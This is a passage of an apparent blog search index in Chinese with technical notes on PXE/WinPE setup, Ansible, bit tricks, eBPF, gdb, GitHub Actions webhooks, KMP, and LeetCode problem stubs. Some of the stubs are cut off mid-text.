negotiated\nreboot\n\n也可以用rededit改找\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa改成5\n怎麼設定tftp\ntftp主要就是\n\n設定root\n勾pxe支援(如果有的話)\n如果是在linux上跑，還要多remap，因為path的表示方式不一樣\n\n大概像下面這樣\n\n怎麼設定dhcp\ndhcp除了基本的ip range還有一個是boot file\nboot file就是pxe client要怎麼載入初始環境(win是winpe, linux是initrd)的指示檔案\n這裡是用UEFI，所以路徑放\\Boot\\bootmgfw.efi\n大概像下面這樣\n\n怎麼call到iso\n\n在tftp的root中放一個iso的資料夾，裡面放iso的內容\n設定成公開(要可以用smbda連)\n創一個有密碼的帳號(我這裡是給iso/iso)\n\nRef\n設定 PXE 伺服器以載入 Windows PE\nWindows 10 Password Error with Samba Share\nIf you try to mount a share on windows 2008 R2 server the system still prompt for credential even if you type them correctly\n設定 PXE 伺服器以載入 Windows PE\nBoot WINPE over PXE on a UEFI computer\nWinPE: Mount and Customize\n","categories":["Windows","Tips"]},{"title":"ansible tips","url":"/2021/07/ansible-tips/","content":"動機\n這個是用ansible去安裝與設定arch linux遇到的事情記錄在這裡\n\nbecome_user\n會提到這個是為了yay，他不能用root去跑\n所以要另外開一個沒有密碼的sudoer\n- name: create tmp user sudoer file  lineinfile:     path: /etc/sudoers.d/aur_installer-allow-to-sudo-pacman     state: present     line: &quot;aur_installer ALL=(ALL) NOPASSWD: /usr/bin/pacman&quot;     validate: /usr/sbin/visudo -cf %s     create: yes- name: install aur_apps  become: yes  become_user: aur_installer  command: &quot;yay -Sy --noconfirm &#123;&#123; item &#125;&#125;&quot;  with_items: &quot;&#123;&#123; aur_apps &#125;&#125;&quot;- name: remove tmp user  user:    name: aur_installer    state: absent    remove: yes- name: remove useless sudoer file  file:    path: /etc/sudoers.d/aur_installer-allow-to-sudo-pacman    state: absent\nsysrq &amp; chroot &amp; async\nssh可以chroot，但是沒辦法重開機\n但我們還有sysrq，echo b | sudo tee /proc/sysrq-trigger\n發完就重開了，所以不能等\n- name: reboot target (evil way)  shell: &quot;sync; sync; sync; echo b | sudo tee /proc/sysrq-trigger&quot;  async: 123 # 隨便填  poll: 0 # 不去看有沒有完成\nuse systemctl\nansible的systemd，會看status code，但是有的service的status code不是ansible想看的，所以會被當成錯誤，直接用command或是shell吧\nmultiple lines\n就是mutltiple lines\n- name: patch css  lineinfile:    path: &quot;~&#123;&#123; user_id &#125;&#125;/theme/&#123;&#123; item &#125;&#125;&quot;    line: |     .login-dialog &gt; StBoxLayout &#123;        background-color: rgb(248, 160, 201);        border: 1px solid #cccccc41;        box-shadow: 0 3px 9px 1px rgba(0, 0, 0, 0.5);        border-radius: 6px;        padding: 12px 40px 24px 40px; &#125;\n換密碼\n要帶password_hash，不然會換成奇怪的東西\n- name: change root pw  user:    name: root    password: &quot;&#123;&#123; root_pw | password_hash(&#x27;sha512&#x27;) &#125;&#125;&quot;\ncallback\nrole可以用import_role與include_role來達成callback效果\n主程式\nroles/mm/tasks/main.yaml\n- name: test include_role  import_role:    name: common    tasks_from: a  vars:    arg1: b    ff: from same layer\ncallback function\nroles/mm/tasks/b.yaml\n- name: hi  debug:    msg: i&#x27;m a callback\n執行callback的function\nroles/common/tasks/a.ymal\n- name: print str  debug:    msg: hello, world- name: test include_role  include_role:    name: mm    tasks_from: &quot;&#123;&#123; arg1 &#125;&#125;&quot;- name: print str  debug:    msg: &quot;hello, end, &#123;&#123; ff &#125;&#125;&quot;\ninclude_role &amp; import_role\n如果roles/common/tasks/a.ymal中的include_role改用import_role，\ntasks_from: &quot;&#123;&#123; arg1 &#125;&#125;&quot;的arg1就不會被展開!!\n所以import_role是靜態的，他只會把&#123;&#123; arg1 &#125;&#125;整個帶進去，把role直接展開\n而include_role會經過運算，所以變數會展開，所以是動態的\n","categories":["Utils","Ansible"]},{"title":"bit tricks","url":"/2021/07/bits-trick/","content":"動機\n之前面試題目有遇過bit trick的考題，用到lowBit!!\n所以來記錄一下\n這篇不記錄要table或是常數的做法，這裡只記錄用bit operation與負號就能用的手法，如果需要看這裡\n\n需要工具\n\n-n (2補數，not是1補數)\n\n取not再加1\n\n\n-1\n\n把到LSM(最左)最近的1mark成0，剩下的到LSM之間的用成1\n可以想成把1往左拖，經過的地方都會變成1，類似痕跡\n像1000扣1後，變成0111\n\n\n^ (xor)\n&amp;,|\n\n思考方式\n如果是設定就直接用and,or,xor\n如果是要num的bit，就從想要的bit開始，用-n,-1再搭配and\n乘除有關就是左右移了\n當成array\n\nset第i個是1: ret = ret | (1 &lt;&lt; i)\nunset第i個: ret = ret &amp; ~(1 &lt;&lt; i)\ntoggle第i個: ret = ret ^ (1 &lt;&lt; i)\ncheck第i個由沒有被set: ret = ret &amp; (1 &lt;&lt; i)\n把LSB(最右)到第i個清0: ret = ret &amp; ~((1 &lt;&lt; (i+1))-1)\n把MSB(最左)到第i個清0: ret = ret &amp; ((1 &lt;&lt; i)-1)\n\n幾個bits被set\nwhile (n) &#123;  n = n &amp; (n-1);  ret++;&#125;return ret;\nreverse\nunsigned int v;     // input bits to be reversedunsigned int r = v; // r will be reversed bits of v; first get LSB of vint s = sizeof(v) * CHAR_BIT - 1; // extra shift needed at endfor (v &gt;&gt;= 1; v; v &gt;&gt;= 1)&#123;     r &lt;&lt;= 1;  r |= v &amp; 1;  s--;&#125;r &lt;&lt;= s; // shift when v&#x27;s highest bits are zero\n最靠左的1\n\nget: n &amp; (-n)\ndel: n &amp; (n-1)\n\n算餘數\nconst unsigned int n;          // numeratorconst unsigned int s;const unsigned int d = 1U &lt;&lt; s; // So d will be one of: 1, 2, 4, 8, 16, 32, ...unsigned int m;                // m will be n % dm = n &amp; (d - 1); \n大小寫\n\n小寫: ch |= ' '\n大寫: ch &amp;= '_'\n\n其實就是' '的not\n\n\n\n是不是2的次方數\n(x &amp;&amp; !(x &amp; x-1))\n被3整除?\n3: 11\n6: 1100\n9: 1111\n所以可以看兩位是不是都是1來看是不是整除3\nint divide3(int a)&#123;    int ans = 0;    while(a)&#123;        ans += a&amp;1;        a&gt;&gt;=1;        ans -= a&amp;1;        a&gt;&gt;=1;    &#125;    return !(ans);&#125;\nRef\nBit Tricks for Competitive Programming\nBitwise Hacks for Competitive Programming\nBit Twiddling Hacks\n","categories":["C++","FAQ"]},{"title":"bpf使用筆記","url":"/2021/07/bpf-tutorial/","content":"動機\nsystemtap看完後就是bpf了\n\nebpf\n\n放一台vm在kernel中當內線\n\n跑verfier與自己的bytecode\n所以會有自己的IR，過llvm轉成bytecode\n詳細看BPF Internals (eBPF)\n\n\n用處\n\ntrace, profile, observe, monitor\n\n這裡就與systemtap很像\n但是現在bpf的code其實不好上手\n\nbpftrace整體與systemtap很像，但\n\n不能透過probe去找對應的source code\n沒有embed c, context var\n\n\nbcc是幫助開發者寫bpf的工具，但\n\n現在在從bcc c/python轉移到libbpf\n\n十分年輕，看commit時間，一年多一點點開始\n但libbpf有\n\nBPF CO-RE: bpf的目標，邊一次到處跑\n\nBTF: 進化的DWARF，同時也有bpf的執行檔資訊\nlibbpf: 很像compiler+linker+bootstraper\n\n生vmlinux.h: 不用裝linux-header了，也不用include了\n配合BTF與bpf的ELF設定需要的object與load bpf程式\n提供處理kernel版本差異的方法\n\nextern Kconfig: extern u32 CONFIG_HZ __kconfig;\nstruct flavors: 讓relocate時用本機的struct\n\n\n\n\n\n\n\n\n\n\nlibbpf的寫法十分神奇\n\n\n\n\n\n\nsecurity, network\n\n可以鎖syscall，在到network stack之前就過濾封包\n\n\n\n\nbpf程式架構\n\nmap\n\n類似mmap, kmap的map，大塊的可以與userspace溝通的記憶體，拿來放一些資料結構\n\n\nhelper\n\nbpf不放行直接碰kernel的變數，所以要用這個，當成syscall\n\n\nperf的ring buf\n\nbpf把資料傳回userspace的手段\n\n\nbytecode\nprobe+action\n\n\n\nhow to use\n\n我只想做monitor\n\nbcc提供的工具\nbpftrace去跑script\n\n\n我想開發bpf\n\n看完前面兩個，再看libbpf\n\n\n\nbcc的工具\n\n出事的60秒quick check\n\nuptime\ndmesg -T | tail\nvmstat 1\nmpstat -P ALL 1\npidstat 1\niostat -xz 1\nfree -m\nsar -n DEV 1\nsar -n TCP,ETCP 1\ntop\n\n\n用bcc的工具\n\nexecsnoop: 看exec的syscal，會列ret\next4slower: 把file io太慢的proc列出來\nbiolatency: block io in hist\ngethostlatency: call getaddrinfo/gethostbyname的延遲，抓DNS延遲\nrunqlat: scheduler latency in hist\nbiosnoop: 列proc使用block io的狀況，會列latency\ncachestat: 列cache成功與失敗的比率，每秒一筆\ntcpconnect: 列用tcp connect的程式(不用煩惱netstat有沒有裝了)\ntcpaccept: 列用tcp accept的程式\nprofile: perf\nopensnoop: 看open的syscall，會列err\n實際上的demo\n\n\n\n完整工具列表\n\nbcc github上的工具列表\nbpftrace\n\nprobe[,probe,...] /filter/ &#123; action; ... &#125;\n\nprobe用:\n\nsystemtap用.\n\n\nfilter是optional\n\nsystemtap是用if自己做\n\n\n\n\nprobe: 括號是縮寫\n\nBEGID, END\ndynamic tracing\n\nkernel space\n\nkprobe(k)\n\nkprobe:function_name[+offset]\n\n會有args: arg0, arg1, …\n\n如果arg都放在stack\n\nsarg0, sarg1, …\n\n\n\n\n\n\n\n\nkretprobe(kr)\n\nkretprobe:function_name\n\nretval\n\n\n\n\nkfunc &amp; kretfunc\n\nkfunc:function &amp; kretfunc:function\n會有args: args-&gt;name\nkretfunc會多retval\n可以用bpftrace -lv去看有什麼參數與函數\n\n\n\n\nuser space\n\nuprobe(u)\n\nuprobe:library_name:function_name[+offset]\nuprobe:library_name:address\n\n會有args: arg0, arg1, …\n\n\n\n\nuretprobe(ur)\n\nuretprobe:library_name:function_name\n\nretval\n\n\n\n\n\n\n\n\nstatic tracing\n\nkernel space\n\ntracepoint(t)\n\ntracepoint:name\n\n\n\n\nuser space\n\nusdt(U)\n\nusdt:binary_path:probe_name\nusdt:binary_path:[probe_namespace]:probe_name\nusdt:library_path:probe_name\nusdt:library_path:[probe_namespace]:probe_name\n\n\n\n\n\n\nelse\n\nprofile(p): perf的抽樣\n\nprofile:hz:rate\n\n單位: hz, s, ms, us\nrate: 次數\n\n\n\n\nsoftware(s): perf的software事件 man perf_event_open\n\nsoftware:event_name:count or software:event_name\nevent\n\ncpu-clock(cpu)\ntask-clock\npage-faults(faults)\ncontext-switches(cs)\ncpu-migrations\nminor-faults\nmajor-faults\nalignment-faults\nemulation-faults\ndummy\nbpf-output\n\n\n\n\nhardware(h): perf的hardware事件 man perf_event_open\n\nhardware:event_name:count or hardware:event_name\nevent\n\ncpu-cycles(cycles)\ninstructions\ncache-references\ncache-misses\nbranch-instructions(branchs)\nbranch-misses\nbus-cycles\nfrontend-stalls\nbackend-stalls\nref-cycles\n\n\n\n\ninterval(i): timer\n\ninterval:ms:rate\n\n單位: hz, s, ms, us\nrate: 次數\n\n\n\n\n\n\n可以在某些probe用wildcard，k:vfs_*\n還有看mem與probe的iterator在這裡\n\n\naction\n\nbuildin function\n\nprintf\nsignal\n…\n直接看這裡\n\n\nmap function\n\n語法真的很神奇\n\n@name = map-function(val)\n\n我是這樣想: @name = map-function(@name, val)\n\nmap function會去讀map與val產生新的map\n\n\n\n\n\n\ncount\nhist\nmin, max\n剩下這裡\n\n\nbuildin var\n\npid, tid, uid, gid, cpid(child pid)\nkstack, ustack: kernel, user stack\n$1,$2…: bpftrace的參數\nrand: 就是rand\ncpu, cgroup: cpu id, cgroup id\ncomm: proc name\nfunc: function name\nprobe: probe name\nnssec, elapsed: timestamp in ns, bpftrace的運行時間\n\n\ncontroll structrue\n\nif (expr) &#123;&#125; else &#123;&#125;\n\n(expr) ? expr1 : expr2;\n\n\nunroll (expr) &#123;&#125; (loop)\ncomment: //, /**/\n\n\n\n\nvar\n\nlocal: $name\nglobal: @name\n\n這個其實就是map，拿來放置大物件的\n\n\nbuildin: name\n沒有struct?\n\n自己寫\ninclude(同c)\n生BTF\n\n\ncast(同c)\n\n\ndata structrue\n\narray(hash)\n\n@associative_array_name[key_name, key_name2, ...]\n\n\ntuple\n\n$t = (expr1, expr2, ...)\n$t.1; $t.2;\n\n\n\n\n\nlibbpf\n參考資料在?\n範例在兩個地方\n\nlibbpf-bootstrap\nbcc的libbpf-tools\n\n有說明文\n\nBCC to libbpf conversion guide\n\n雖說是BCC到libbpf，但裡面涵蓋寫libbpf需要注意的點\n\n\nTips and Tricks for Writing Linux BPF Applications with libbpf\n\n誠如標題所示，就是tip與trick\n\n\nBuilding BPF applications with libbpf-bootstrap\n\nlibbpf-bootstrap講解\n\n\n\n主角，libbpf的code，在這裡\n建議從libbpf-bootstrap開始看，下面用examples/c/krpobe來看，看看每個用libbpf都會有的東西\n兩個code: userspace &amp; bpf\n現在程式分成userspace的kprobe.c與bpf的kprobe.bpf.c\nkprobe.c: 會做跑bpf的前置工作與等bpf完成\nkprobe.bpf.c: 實際跑bpf probe的地方\nuserspace\nheader有#include &quot;kprobe.skel.h&quot;\nlibbpf生的header，裡面有與bpf溝通需要的東西與libbpf的API\nlibbpf_print_fn 與 bump_memlock_rlimit\nlibbpf_print_fn就是printk之類的，可以在裡面設定需要多燒level才print\nbump_memlock_rlimit是設定bpf的mem用量\n載入到執行到移除\n\nbootstrap_bpf__open\n\n\n把bpf的code讀進來\n拿到struct bootstrap_bpf\n\n可以改裡面的參數\n\n\n\n\nbootstrap_bpf__load\n\n\n開始創map，把code丟到verifier\n\n\nbootstrap_bpf__attach\n\n\n開始跑\n之後就是看userspace要做什麼\n\n\nbootstrap_bpf__destroy\n\n\n把bpf停掉\n\nbpf\nherder\n#include &quot;vmlinux.h&quot;               /* all kernel types */#include &lt;bpf/bpf_helpers.h&gt;       /* most used helpers: SEC, __always_inline, etc */#include &lt;bpf/bpf_core_read.h&gt;     /* for BPF CO-RE helpers */#include &lt;bpf/bpf_tracing.h&gt;       /* for getting kprobe arguments */\nmap\nstruct &#123;\t__uint(type, BPF_MAP_TYPE_HASH);\t__uint(max_entries, 8192);\t__type(key, pid_t);\t__type(value, u64);&#125; exec_start SEC(&quot;.maps&quot;);\n\n有關的type在bpf.h\n\n\n但struct要放什麼就要去找範例了\n\n\n要加SEC(&quot;.maps&quot;)\n\nprobe\nSEC(&quot;tp/sched/sched_process_exec&quot;)int handle_exec(struct trace_event_raw_sched_process_exec *ctx)&#123;  //...\treturn 0;&#125;\n\n在SEC放probe\n不同probe的函數宣告方式不一樣，像kprobe要BPF_KPROBE(...)這macro\n\n\n找範例去對，現在還沒看到像樣的文件\n\nhelper\ntask = (struct task_struct *)bpf_get_current_task();bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));bpf_probe_read_str(&amp;e-&gt;filename, sizeof(e-&gt;filename), (void *)ctx + fname_off);\n這些helper都在bpf_helper_defs.h\nRef\nbpftrace Cheat Sheet\nbpftrace Reference Guide\nBPF binaries: BTF, CO-RE, and the future of BPF perf tools\nBPF Internals (eBPF)\nBPF Portability and CO-RE\n","categories":["System","Performance"]},{"title":"bst的faq","url":"/2021/07/bst-faq/","content":"動機\n剛好看到，紀錄一下\n\ndelete\nclass Solution:    def deleteNode(self, root: Optional[TreeNode], key: int) -&gt; Optional[TreeNode]:        if not root:            return None        elif root.val &gt; key:            root.left = self.deleteNode(root.left, key)            return root        elif root.val &lt; key:            root.right = self.deleteNode(root.right, key)            return root        else:            if not root.left and not root.right:                return None            elif not root.left:                return root.right            elif not root.right:                return root.left            else:                # find min in root.right                now = root.right                prev = root                while now.left:                    prev, now = now, now.left                                if now == root.right: # no left                    now.left = root.left                else:                    prev.left = now.right                    now.left = root.left                    now.right = root.right                return now\nthreading binary tree\n不用遞迴與stack完成inorder走訪，雖然說放這裡感覺與bst無關，不過我暫時想不到放哪就先這樣\n就是在inorder走訪時，想像像linked list一樣，有一個prev，之後就是開始連接，修prev與現在的node\n左邊指回去，右邊指回來 (其實要反過來應該也可以)\n中序\nclass Node:  def __init__(self):    self.is_left = self.is_right = True    self.left = self.right = Nonedef threading(root,prev = None):  if root is None:    return  else:    threading(root.left, prev)    # left 指回去    if root.left is None:      root.is_left = False      root.left = prev    # right 指回來，變成一個圈    if prev is not None:      prev.is_right = False      prev.right = root        threading(root.right, root)\n前序\ndef pre(root,prev):    if root:        originRight = root.right        pro = pre(root.left, root)        ret = pre(originRight, pro)        if prev:            prev.left, prev.right = None, root        # 目前最大的node        if not pro and not ret:            return root        elif not pro or not ret:            return [x for x in [pro,ret] if x][0]        else:            return ret    else:        return Nonepre(root, None)","categories":["Algorithm","Classic"]},{"title":"gdb使用筆記","url":"/2021/07/gdb-tutorial/","content":"動機\n之前不常用記錄一下\n\nbasic\n\n印\n\n變數val: print(p) &#123;var&#125;\n\n追蹤var(step每次都印): display &#123;var&#125;\n\n\n變數type: whatis &#123;var&#125;\ncode: list(l)\n資訊: info ??\n\nbreak\n\n下面hook的list\n\n\nthreads\n\nthread &#123;thread-id&#125;: 換到某個thread去\n\n\nforks\n\nfork &#123;fork-id&#125;: 換到某個proc去\n\n\nshare\nlocals\nargs\nreg / all-regs\n\n\n\n\n跑: run\n離開gdb: quit(q)\n設定gdb參數: set &#123;key&#125; &#123;val&#125;\nkill: kill [sig]\n處理gdb收到的sig: handle &#123;sig&#125; nostop noprint ...\n\nhook\n\nbreakpoint(b)\n\n設定: b &#123;addr&#125; or &#123;funcname&#125; or &#123;filename:line-num&#125;\n\n條件成立才設: b &#123;pat&#125; if expr\n\nb main.cpp:255 if strA.compare(strB) != 0\n\n\n\n\n\n\nwatchpoint\n\n設定在??時中斷:\n\n寫: watch &#123;expr&#125;\n讀: rwatch &#123;expr&#125;\n寫或讀: awatch &#123;expr&#125;\n\n\n\n\ncatchpoint\n\n中斷一次就好: tcatch &#123;??&#125;\n設定在??發生時中斷: catch &#123;??&#125;\n\nthrow\ncatch\nexec/fork/vfork\nload/unload libname\n\n\n\n\n操作hook\n\n啟用/停用: enable / disable\n刪br: clear(delete)\n繼續跑: continue\n先不要跑: ignore &#123;br_id&#125; num\n跑到br就做下面的事: commands &#123;br_id&#125; ... end 一行一個指令\n\ncommand 1\n    print param2\n    print param3-&gt;member1\n    continue\nend\n\n\n\n\n\n對stack與function上下其手\n\nstack\n\n現在整個stack: bt\n上一層: up [num]\n下一層: down\n現在這一層: frame [num]\n\n單行執行: step or next\n把loop跑完: until\n直接return: return\n把frame跑完: finish\n\n\n\n\n我就是要跳: jump &#123;addr&#125; or &#123;filename:line-num&#125;\n\nreg, addr, signal\n\naddr -&gt; val\n\nexamine(x): x/&#123;COUNT&#125;&#123;FMT&#125;&#123;SIZE&#125; &#123;ADDRESS&#125;\n\nFMT: octal(o), hex(h), decimal(d) …\nSIZE: byte(b), word(w), giant(g)\n\n\n\n\n看reg: $&#123;reg&#125;\nhandle &#123;SIG&#125; &#123;ACT&#125;\n\nSIG: SIGHUP, SIGINT, …\n\n可以看shell kill -l\n\n\nACT: 收到SIG時，做什麼，不要就是前面加no(nostop)\n\nstop: 程式停下來\nprint: 印出這個SIG\npass: relay SIG到被觀察的程式 (選no就是會sig被擋掉，因為沒有relay過去)\n\n\n\n\n\ncore dump\n生core dump\nulimit -c unlimitedcat /proc/sys/kernel/core_patternecho   “1” &gt; /proc/sys/kernel/core_uses_pid # 我不想打proc name\nman core\n使用core dump\n\ngdb &#123;proc-path&#125; &#123;coredump&#125;\ngdb -c &#123;coredump&#125;\n\n如果有開core_uses_pid\n\n\n\nscript\n\n自訂function: define &#123;func-name&#125; ... end\n引入script: source &#123;path&#125;\n變數: set $&#123;var&#125; = &#123;val&#125;\n\ngdbserver\n兩邊準備同一個與source code\n之後就可以透過server在client的gdb做除錯\ngdbserver localhost:8888 progtarget remote 192.168.81.173:8888 prog\n複習asm與debug\nAssembly And The Art Of Debugging\nreverse debug的範例\n假設有一個程式多跑幾次就會seg fault\n\n讓他在gdb一直跑\n\nb main # main的bb _exit # 最後一行的bcommand 1recordcontinueendcommand 2runend\n\n爆了，看pc現在指到哪\n\np $pc # 假設是 (void (*))0x5e4c5d00p/x $*0x5e4c5d00 # 試著拿值看看，應該是不行\n\n開始往後追\n\nreverse-stepi # 往後disassemble # 現在在跑什麼，假設發現，是最後的return發生問題p $sp #  (void *) 0x7fffffffdc98 出事的addrwatch *(long**)0x7fffffffdc98 # 有人動了就停下來reverse-continue # 往後，等停下來就是出事的位置\nRef\nHow to get a core dump for a segfault on Linux\nHow to Debug Programs on Remote Server using GDBServer Example\nScripting GDB\nGDB實用教學：自動化你的debug\n","categories":["System","Linux","Tips"]},{"title":"透過webhook讓github actions rebuild","url":"/2021/07/github-actions-rebuild/","content":"動機\n因為另一個project的需求\n需要CI可以透過web api來rebuild，所以就換到github action了\n\nrepository_dispatch\n可以自訂type，就可以透過curl去打API\n在yaml中放repository_dispatch\non:  repository_dispatch:    types: rebuild\n這樣就可以用curl讓github action啟動\ncurl -H &quot;Accept: application/vnd.github.v3+json&quot; \\             -H &quot;Authorization: token $MY_SECRET&quot; \\             --request POST \\             --data &#x27;&#123;&quot;event_type&quot;: &quot;rebuild&quot;&#125;&#x27; \\             https://api.github.com/repos/name/repo/dispatches\n如果要帶env\n- env:    MY_SECRET: $&#123;&#123; secrets.PERSONAL_TOKEN &#125;&#125;  run: |    curl -H &quot;Accept: application/vnd.github.v3+json&quot; \\         -H &quot;Authorization: token $MY_SECRET&quot; \\         --request POST \\         --data &#x27;&#123;&quot;event_type&quot;: &quot;rebuild&quot;&#125;&#x27; \\         https://api.github.com/repos/name/repo/dispatches","categories":["Utils","Small project","CI","Github Action"]},{"title":"kmp-algorithm","url":"/2021/07/kmp-algorithm/","content":"動機\n雖然說現在它的主場只存在於課本中，但好像還是有人喜歡問…\n改成用遞迴比較好懂\n之後還有Boyer–Moore algorithm阿\ngood suffix真的不好懂\n\nnaive\n每次失敗就從頭開始\ndef fail(j):  return 0def match(s,p):  j = 0  i = 0  while i &lt; len(s):    if j == len(p):      print(&quot;match at &#123;&#125;&quot;.format(i))      return    elif s[i] == p[j]:      j += 1      i += 1    elif j == 0:      i += 1    else:      j = fail(j)  print(&quot;no match&quot;)\nKnuth-Morris-Pratt algorithm\n如果pattern裡面有重複的，可以移過去!!\n像是abababb，如果在最後一個a出事，下一個應該要從第二個的前一位開始\n所以我們假設fail給到目前為止成功的位置，會給出下一次要從哪邊開始\n有兩個case\n\n在起點(0)成功或是失敗，就是從頭開始\n在其他地方成功\n\n\n往已經比完的地方看，一直往前看給出的下一個位置的字是不是與比對成功的字一樣\n\n一樣就可以回傳該位置加一(字一樣會比對失敗，所以要下一位)\n不一樣就是比對失敗，從頭開始，也因為loop的條件，所以只要一直不一樣最後就會是0\n\n\n\n@functools.lru_cache(None)def fail(p,i):  if i &lt;= 0:    return 0  else:    j = fail(i-1)    while j &gt; 0 and p[j] != p[i]:      j = fail(j-1)    return j+(1 if p[j] == p[i] else 0)    def match(s,p):  j = 0  i = 0  while i &lt; len(s):    if j == len(p):      print(&quot;match at &#123;&#125;&quot;.format(i))      return    elif s[i] == p[j]:      j += 1      i += 1    elif j == 0:      i += 1    else:      j = fail(j-1)  print(&quot;no match&quot;)","categories":["Algorithm","Classic"]},{"title":"leetcode-1 - Two Sum","url":"/2021/07/leetcode-1/","content":"動機\nlambda加map好方便\n\nProblem\nGiven an array of integers nums and an integer target, return indices of the two numbers such that they add up to target.You may assume that each input would have exactly one solution, and you may not use the same element twice.You can return the answer in any order. Example 1:Input: nums = [2,7,11,15], target = 9Output: [0,1]Output: Because nums[0] + nums[1] == 9, we return [0, 1].Example 2:Input: nums = [3,2,4], target = 6Output: [1,2]Example 3:Input: nums = [3,3], target = 6Output: [0,1] Constraints:2 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Hash Table"]},{"title":"leetcode-100 - Same Tree","url":"/2021/07/leetcode-100/","content":"動機\n複習dfs與bfs\n\nProblem\nGiven the roots of two binary trees p and q, write a function to check if they are the same or not.Two binary trees are considered the same if they are structurally identical, and the nodes have the same value. Example 1:Input: p = [1,2,3], q = [1,2,3]Output: trueExample 2:Input: p = [1,2], q = [1,null,2]Output: falseExample 3:Input: p = [1,2,1], q = [1,1,2]Output: false Constraints:The number of nodes in both trees is in the range [0, 100].-104 ","categories":["Algorithm","Leetcode","seanprashad","Blind Curated 75"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-101 - Symmetric Tree","url":"/2021/07/leetcode-101/","content":"動機\n複習bfs\n\nProblem\nGiven the root of a binary tree, check whether it is a mirror of itself (i.e., symmetric around its center). Example 1:Input: root = [1,2,2,3,4,4,3]Output: trueExample 2:Input: root = [1,2,2,null,3,null,3]Output: false Constraints:The number of nodes in the tree is in the range [1, 1000].-100 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-102 - Binary Tree Level Order Traversal","url":"/2021/07/leetcode-102/","content":"動機\n複習bfs\n\nProblem\nGiven the root of a binary tree, return the level order traversal of its nodes' values. (i.e., from left to right, level by level). Example 1:Input: root = [3,9,20,null,null,15,7]Output: [[3],[9,20],[15,7]]Example 2:Input: root = [1]Output: [[1]]Example 3:Input: root = []Output: [] Constraints:The number of nodes in the tree is in the range [0, 2000].-1000 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Breadth-First Search","Binary Tree","Tree"]},{"title":"leetcode-103 - Binary Tree Zigzag Level Order Traversal","url":"/2021/07/leetcode-103/","content":"動機\n因為102的走是用level來分，所以這裡當輸出改變的時候就不用改太多\n\nProblem\nGiven the root of a binary tree, return the zigzag level order traversal of its nodes' values. (i.e., from left to right, then right to left for the next level and alternate between). Example 1:Input: root = [3,9,20,null,null,15,7]Output: [[3],[20,9],[15,7]]Example 2:Input: root = [1]Output: [[1]]Example 3:Input: root = []Output: [] Constraints:The number of nodes in the tree is in the range [0, 2000].-100 ","categories":["Algorithm","Leetcode","60 questions to solve","Top Interview Questions","seanprashad"],"tags":["Breadth-First Search","Binary Tree","Tree"]},{"title":"leetcode-104 - Maximum Depth of Binary Tree","url":"/2021/07/leetcode-104/","content":"動機\n複習dfs\n\nProblem\nGiven the root of a binary tree, return its maximum depth.A binary tree's maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node. Example 1:Input: root = [3,9,20,null,null,15,7]Output: 3Example 2:Input: root = [1,null,2]Output: 2Example 3:Input: root = []Output: 0Example 4:Input: root = [0]Output: 1 Constraints:The number of nodes in the tree is in the range [0, 104].-100 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-105 - Construct Binary Tree from Preorder and Inorder Traversal","url":"/2021/07/leetcode-105/","content":"動機\n複習inorder與preorder\n可以順便看106\n\nProblem\nGiven two integer arrays preorder and inorder where preorder is the preorder traversal of a binary tree and inorder is the inorder traversal of the same tree, construct and return the binary tree. Example 1:Input: preorder = [3,9,20,15,7], inorder = [9,3,15,20,7]Output: [3,9,20,null,null,15,7]Example 2:Input: preorder = [-1], inorder = [-1]Output: [-1] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Divide and Conquer","Hash Table","Binary Tree","Tree"]},{"title":"leetcode-106 - Construct Binary Tree from Inorder and Postorder Traversal","url":"/2021/07/leetcode-106/","content":"動機\n把105改一下\n\nProblem\nGiven two integer arrays inorder and postorder where inorder is the inorder traversal of a binary tree and postorder is the postorder traversal of the same tree, construct and return the binary tree. Example 1:Input: inorder = [9,3,15,20,7], postorder = [9,15,7,20,3]Output: [3,9,20,null,null,15,7]Example 2:Input: inorder = [-1], postorder = [-1]Output: [-1] Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["Array","Divide and Conquer","Hash Table","Binary Tree","Tree"]},{"title":"leetcode-108 - Convert Sorted Array to Binary Search Tree","url":"/2021/07/leetcode-108/","content":"動機\n複習dfs\n\nProblem\nGiven an integer array nums where the elements are sorted in ascending order, convert it to a height-balanced binary search tree.A height-balanced binary tree is a binary tree in which the depth of the two subtrees of every node never differs by more than one. Example 1:Input: nums = [-10,-3,0,5,9]Output: [0,-3,9,-10,null,5]Explanation: [0,-10,5,null,-3,null,9] is also accepted:Example 2:Input: nums = [1,3]Output: [3,1]Explanation: [1,3] and [3,1] are both a height-balanced BSTs. Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["Array","Divide and Conquer","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-1091 - Shortest Path in Binary Matrix","url":"/2021/07/leetcode-1091/","content":"動機\n找最短路徑，bfs\n但是沒想到最後死在判別重複上\n\nProblem\nGiven an n x n binary matrix grid, return the length of the shortest clear path in the matrix. If there is no clear path, return -1.A clear path in a binary matrix is a path from the top-left cell (i.e., (0, 0)) to the bottom-right cell (i.e., (n - 1, n - 1)) such that:All the visited cells of the path are 0.All the adjacent cells of the path are 8-directionally connected (i.e., they are different and they share an edge or a corner).The length of a clear path is the number of visited cells of this path. Example 1:Input: grid = [[0,1],[1,0]]Output: 2Example 2:Input: grid = [[0,0,0],[1,1,0],[1,1,0]]Output: 4Example 3:Input: grid = [[1,0,0],[1,1,0],[1,1,0]]Output: -1 Constraints:n == grid.lengthn == grid[i].length1 